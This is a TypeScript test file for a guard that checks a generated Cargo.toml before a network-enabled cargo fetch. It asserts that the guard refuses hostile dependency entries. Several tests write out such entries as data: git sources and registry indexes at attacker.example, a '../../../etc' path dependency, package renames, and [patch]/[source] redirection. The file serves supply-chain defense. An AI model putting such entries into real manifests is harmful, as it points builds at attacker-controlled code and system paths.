/**
 * #32 — assertManifestFetchSafe is the final-artifact guard in front of the
 * only network-enabled cargo invocation (the `cargo fetch` warm-up). Intake
 * validation (validateAnchorExtraDeps, scaffold source-override guard)
 * blocks injection at the API boundary; this re-checks the Cargo.toml that
 * actually reached disk immediately before the fetch is granted egress, so
 * a future call-path that skips intake — or a validator gap — still can't
 * point cargo at an attacker host.
 */
import { describe, test, expect } from "bun:test";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { assertManifestFetchSafe } from "../src/build/sandbox.ts";

function manifest(content: string): string {
  const dir = mkdtempSync(join(tmpdir(), "anvil-manifest-guard-"));
  const p = join(dir, "Cargo.toml");
  writeFileSync(p, content, "utf-8");
  return p;
}

const SAFE_HEADER = `[package]
name = "prog"
version = "0.1.0"
edition = "2021"
[lib]
crate-type = ["cdylib", "lib"]
name = "prog"
[features]
no-entrypoint = []
`;

describe("#32 — cargo-fetch manifest guard", () => {
  test("the real generated shape passes (version pins, inline feature tables, [lib], [profile])", () => {
    const p = manifest(`${SAFE_HEADER}
[dependencies]
anchor-lang = { version = "0.31", features = ["init-if-needed"] }
anchor-spl = "0.31"
borsh = { version = "1.5", features = ["derive"] }
[profile.release]
overflow-checks = true
`);
    expect(() => assertManifestFetchSafe(p)).not.toThrow();
  });

  test("git dependency is refused — bare and TOML-quoted key forms", () => {
    for (const dep of [
      `evil = { git = "https://attacker.example/x.git" }`,
      `evil = { "git" = "https://attacker.example/x.git" }`,
      `evil = { 'git' = "https://attacker.example/x.git" }`,
    ]) {
      const p = manifest(`${SAFE_HEADER}\n[dependencies]\n${dep}\n`);
      expect(() => assertManifestFetchSafe(p)).toThrow(/manifest guard/);
    }
  });

  test("path / registry / package renames inside dependency tables are refused", () => {
    for (const dep of [
      `evil = { path = "../../../etc" }`,
      `evil = { registry = "attacker-reg", version = "1" }`,
      `innocent-name = { package = "actually-evil", version = "1" }`,
    ]) {
      const p = manifest(`${SAFE_HEADER}\n[dependencies]\n${dep}\n`);
      expect(() => assertManifestFetchSafe(p)).toThrow(/manifest guard/);
    }
    // dev- and target-scoped dependency tables are covered too
    const p = manifest(`${SAFE_HEADER}\n[dev-dependencies]\nevil = { git = "https://a.example/x" }\n`);
    expect(() => assertManifestFetchSafe(p)).toThrow(/manifest guard/);
  });

  test("[patch] / [source] / replace-with redirection is refused anywhere", () => {
    for (const block of [
      `[patch.crates-io]\nanchor-lang = { git = "https://attacker.example/anchor" }`,
      `[source.crates-io]\nreplace-with = "attacker"`,
      `[registries.attacker]\nindex = "https://attacker.example/index"`,
    ]) {
      const p = manifest(`${SAFE_HEADER}\n${block}\n`);
      expect(() => assertManifestFetchSafe(p)).toThrow(/manifest guard/);
    }
  });

  test("[lib] path and [package] keys do NOT false-positive; comments are ignored", () => {
    const p = manifest(`[package]
name = "prog"
version = "0.1.0"
[lib]
path = "src/lib.rs"
crate-type = ["cdylib"]
# git = "this is just a comment"
[dependencies]
anchor-lang = "0.31" # registry note in a comment
`);
    expect(() => assertManifestFetchSafe(p)).not.toThrow();
  });
});
